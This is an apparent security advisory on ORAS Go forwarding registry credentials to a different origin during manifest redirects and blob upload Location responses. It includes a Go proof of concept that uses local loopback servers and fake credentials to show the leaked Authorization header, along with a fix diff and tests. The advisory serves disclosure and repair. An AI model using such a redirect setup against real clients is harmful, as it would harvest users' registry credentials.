# [M] ORAS Go forwards registry credentials across registry redirects

## Summary
Severity: Medium
Advisory: GHSA-vh4v-2xq2-g5cg
CWE: CWE-200, CWE-522
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-01
Source: https://github.com/advisories/GHSA-vh4v-2xq2-g5cg
Type: github-advisory

## Affected
- Go: `oras.land/oras-go/v2` — affected >=0 <2.6.1

## Details
# ORAS Go forwards registry credentials across registry redirects

Reporter / public credit: JUNYI LIU

## Summary

ORAS Go can forward registry credentials configured for one registry origin to a different HTTP origin during registry redirects.

There are two related paths:

1. A manifest or metadata request authenticates to the origin registry, then the origin returns a redirect to another host or port. The redirected request can carry the origin `Authorization` header to the redirect target.
2. A blob upload `POST` authenticates to the origin registry, then the origin returns an upload `Location` on another host or port. The follow-up `PUT` can carry the origin `Authorization` header to the `Location` target.

The upload `Location` issue appears related to the existing public fix in pull request #1152 / GHSA-jxpm-75mh-9fp7. The manifest redirect path is a residual adjacent route: the v2 branch after the upload `Location` fix still forwards Basic credentials on an authenticated manifest redirect.

## Impact

A registry response can cause an ORAS Go or ORAS CLI client to send configured registry credentials to an unintended endpoint. In common workflows, those credentials may come from a registry config / Docker-style auth file rather than command-line flags.

This is a credential exposure across the registry-origin boundary. I am not claiming remote code execution, registry compromise, arbitrary token theft, or live third-party impact.

## Affected Versions Tested

- `oras-go v2.6.0`: affected.
- `oras-go` main at commit `a57383e580c8f2c97fb67dedfc5c9945c8c3614e`: affected.
- `oras-go` v2 branch at commit `d593d504779be8b69f0ba034ac9fd407d1fc8cfc`: upload `Location` path is blocked, but manifest redirect credential forwarding is still affected.
- ORAS CLI at commit `3d2646279c70ba60415440e44c2ff97896e4a209`, using `oras-go v2.6.0`: affected when using `--registry-config`.

## Security Invariant

Credentials resolved for one registry origin should not be silently forwarded to a different origin reached through a registry redirect or upload `Location` response.

## Local Reproduction Overview

All testing used loopback servers and fake credentials only.

Manifest redirect flow:

1. The client requests a manifest from the origin registry.
2. The origin returns `401` with a Basic challenge.
3. The client retries the origin request with the origin credential.
4. The origin returns `307` to another port on the same hostname.
5. The redirect sink receives the origin `Authorization` header.

ORAS CLI stored-credential flow:

1. A temporary registry config contains a fake Basic credential for the origin registry only.
2. Run:

```sh
oras manifest fetch --plain-http --registry-config <config> <origin>/probe:latest
```

3. The origin authenticates the request and redirects it to another port.
4. The redirect sink receives the origin `Authorization` header.

Blob upload `Location` flow:

1. The client starts a blob upload with `POST` to the origin registry.
2. The origin challenges with Basic and then accepts the authenticated `POST`.
3. The origin returns an upload `Location` URL on another port.
4. In affected versions, the follow-up `PUT` to the `Location` target carries the origin `Authorization` header.

## Expected Result

Redirect and upload `Location` targets on a different HTTP origin should not receive the origin `Authorization` header.

## Observed Result

In affected versions, redirect or `Location` sinks received:

```http
Authorization: Basic <base64 origin_user:origin_pass>
```

## Standalone Reproducer

```go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"sync"

	"github.com/opencontainers/go-digest"
	"github.com/oras-project/oras-go/v3/registry/remote"
	"github.com/oras-project/oras-go/v3/registry/remote/auth"
	"github.com/oras-project/oras-go/v3/registry/remote/credentials"
)

type hit struct {
	Method string `json:"method"`
	Path   string `json:"path"`
	Host   string `json:"host"`
	Auth   string `json:"auth,omitempty"`
}

func main() {
	const username = "origin_user"
	const password = "origin_pass"
	const expectedAuth = "Basic b3JpZ2luX3VzZXI6b3JpZ2luX3Bhc3M="
	var mu sync.Mutex
	var originHits, sinkHits []hit

	record := func(dst *[]hit, r *http.Request) {
		mu.Lock()
		defer mu.Unlock()
		*dst = append(*dst, hit{
			Method: r.Method,
			Path:   r.URL.RequestURI(),
			Host:   r.Host,
			Auth:   r.Header.Get("Authorization"),
		})
	}

	manifest := []byte(`{"schemaVersion":2,"mediaType":"application/vnd.oci.image.manifest.v1+json","config":{"mediaType":"application/vnd.unknown.config.v1+json","digest":"sha256:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","size":2},"layers":[]}`)
	manifestDigest := digest.FromBytes(manifest).String()

	sink := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		record(&sinkHits, r)
		if r.Header.Get("Authorization") != expectedAuth {
			w.Header().Set("Www-Authenticate", `Basic realm="redirect-sink"`)
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		w.Header().Set("Content-Type", "application/vnd.oci.image.manifest.v1+json")
		w.Header().Set("Docker-Content-Digest", manifestDigest)
		w.Header().Set("Content-Length", fmt.Sprint(len(manifest)))
		_, _ = w.Write(manifest)
	}))
	defer sink.Close()

	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		record(&originHits, r)
		if r.Header.Get("Authorization") != expectedAuth {
			w.Header().Set("Www-Authenticate", `Basic realm="origin"`)
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		http.Redirect(w, r, sink.URL+r.URL.RequestURI(), http.StatusTemporaryRedirect)
	}))
	defer origin.Close()

	repo, err := remote.NewRepository(origin.Listener.Addr().String() + "/probe")
	if err != nil {
		panic(err)
	}
	repo.PlainHTTP = true
	repo.Client = &auth.Client{
		Client: origin.Client(),
		CredentialFunc: credentials.StaticCredentialFunc(origin.Listener.Addr().String(), credentials.Credential{
			Username: username,
			Password: password,
		}),
	}

	_, _, err = repo.Manifests().FetchReference(context.Background(), "latest")

	leaked := false
	for _, h := range sinkHits {
		if h.Auth == expectedAuth {
			leaked = true
		}
	}

	result := map[string]any{
		"origin_hits": originHits,
		"sink_hits":   sinkHits,
		"error":       "",
		"leaked":      leaked,
	}
	if err != nil {
		result["error"] = err.Error()
	}
	encoded, _ := json.MarshalIndent(result, "", "  ")
	fmt.Println(string(encoded))

	if leaked {
		fmt.Println("VULNERABLE_BEHAVIOR_CONFIRMED")
		return
	}
	fmt.Println("BOUNDARY_HELD_NO_CREDENTIAL_LEAK")
	os.Exit(1)
}
```

## Candidate Fix

The candidate fix does two things:

1. In the auth client, wrap redirect handling so `Authorization` is removed when a redirect changes HTTP origin, while preserving any caller-provided `CheckRedirect` callback.
2. In blob upload completion, only reuse the previous `POST` `Authorization` header when the upload `Location` remains on the same HTTP origin.

The patch also adds regression coverage for both redirect cases:

- redirect before origin authentication reaches a different origin;
- redirect after origin authentication reaches a different origin.

```diff
diff --git a/registry/remote/auth/client.go b/registry/remote/auth/client.go
index 35826eb..60c9f88 100644
--- a/registry/remote/auth/client.go
+++ b/registry/remote/auth/client.go
@@ -122,7 +122,23 @@ func (c *Client) send(req *http.Request) (*http.Response, error) {
 	for key, values := range c.Header {
 		req.Header[key] = append(req.Header[key], values...)
 	}
-	return c.client().Do(req)
+	client := c.client()
+	clientCopy := *client
+	checkRedirect := client.CheckRedirect
+	clientCopy.CheckRedirect = func(redirectReq *http.Request, via []*http.Request) error {
+		if len(via) > 0 && !sameHTTPOrigin(via[len(via)-1].URL, redirectReq.URL) {
+			redirectReq.Header.Del(headerAuthorization)
+		}
+		if checkRedirect != nil {
+			return checkRedirect(redirectReq, via)
+		}
+		return nil
+	}
+	return clientCopy.Do(req)
+}
+
+func sameHTTPOrigin(a, b *url.URL) bool {
+	return strings.EqualFold(a.Scheme, b.Scheme) && strings.EqualFold(a.Host, b.Host)
 }
 
 // credential resolves the credential for the given registry.
@@ -168,6 +184,9 @@ func (c *Client) Do(originalReq *http.Request) (*http.Response, error) {
 	var attemptedKey string
 	cache := c.cache()
 	host := originalReq.Host
+	if host == "" {
+		host = originalReq.URL.Host
+	}
 	scheme, err := cache.GetScheme(ctx, host)
 	if err == nil {
 		switch scheme {
@@ -193,6 +212,13 @@ func (c *Client) Do(originalReq *http.Request) (*http.Response, error) {
 	if resp.StatusCode != http.StatusUnauthorized {
 		return resp, nil
 	}
+	respHost := resp.Request.Host
+	if respHost == "" {
+		respHost = resp.Request.URL.Host
+	}
+	if respHost != host {
+		return resp, nil
+	}
 
 	// attempt again with credentials for recognized schemes
 	challenge := resp.Header.Get(headerWWWAuthenticate)
diff --git a/registry/remote/repository.go b/registry/remote/repository.go
index 74d6b89..0bd20ec 100644
--- a/registry/remote/repository.go
+++ b/registry/remote/repository.go
@@ -982,6 +983,7 @@ func (s *blobStore) Push(ctx context.Context, expected ocispec.Descriptor, conte
 // Push or by Mount when the receiving repository does not implement the
 // mount endpoint.
 func (s *blobStore) completePushAfterInitialPost(ctx context.Context, req *http.Request, resp *http.Response, expected ocispec.Descriptor, content io.Reader) error {
+	originalURL := req.URL
 	reqHostname := req.URL.Hostname()
 	reqPort := req.URL.Port()
 	// monolithic upload
@@ -1016,8 +1018,9 @@ func (s *blobStore) completePushAfterInitialPost(ctx context.Context, req *http.
 	q.Set("digest", expected.Digest.String())
 	req.URL.RawQuery = q.Encode()
 
-	// reuse credential from previous POST request
-	if auth := resp.Request.Header.Get("Authorization"); auth != "" {
+	// reuse credential from previous POST request only when the upload location
+	// remains on the same origin.
+	if auth := resp.Request.Header.Get("Authorization"); auth != "" && sameHTTPOrigin(originalURL, location) {
 		req.Header.Set("Authorization", auth)
 	}
 	resp, err = s.repo.do(req)
@@ -1032,6 +1035,10 @@ func (s *blobStore) completePushAfterInitialPost(ctx context.Context, req *http.
 	return nil
 }
 
+func sameHTTPOrigin(a, b *url.URL) bool {
+	return strings.EqualFold(a.Scheme, b.Scheme) && strings.EqualFold(a.Host, b.Host)
+}
+
 // Exists returns true if the described content exists.
 func (s *blobStore) Exists(ctx context.Context, target ocispec.Descriptor) (bool, error) {
 	if err := s.repo.checkPolicy(ctx, ""); err != nil {
```

## Validation Performed

The repaired candidate fix blocked:

- manifest redirect credential forwarding;
- upload `Location` credential forwarding.

Targeted tests passed:

```sh
go test ./registry/remote/auth -run 'TestClient_Do_Basic_Auth_Redirect|TestClient_Do' -count=1
go test ./registry/remote -run 'Test_BlobStore_Push|TestRepository' -count=1
```

## Prior Art / Duplicate Notes

Public pull request #1152 fixes credential forwarding via unvalidated blob upload `Location` and references GHSA-jxpm-75mh-9fp7. The residual manifest redirect path described here is adjacent but not covered by that PR's stated upload `Location` scope.

Bearer realm credential exfiltration appears to be a separate issue family and is not part of this report's primary claim.

## Claim Boundaries

Proven:

- Origin registry Basic credentials can reach a different redirect or upload `Location` origin in local loopback tests.
- ORAS CLI stored registry credentials can reach a redirect sink in a normal manifest fetch workflow.
- The candidate fix blocks the tested redirect and upload `Location` credential exposures.

Not claimed:

- Live third-party exploitation.
- RCE, host compromise, or registry compromise.
- Arbitrary-host exposure beyond the tested redirect/`Location` origin transitions.
- Bearer realm behavior as part of the same claim.

## References
- https://github.com/oras-project/oras-go/security/advisories/GHSA-vh4v-2xq2-g5cg
- https://github.com/oras-project/oras-go/commit/3c2e884e12ea52b6bff60c97f1edb7df7d0e0909
- https://github.com/oras-project/oras-go
- https://github.com/oras-project/oras-go/releases/tag/v2.6.1
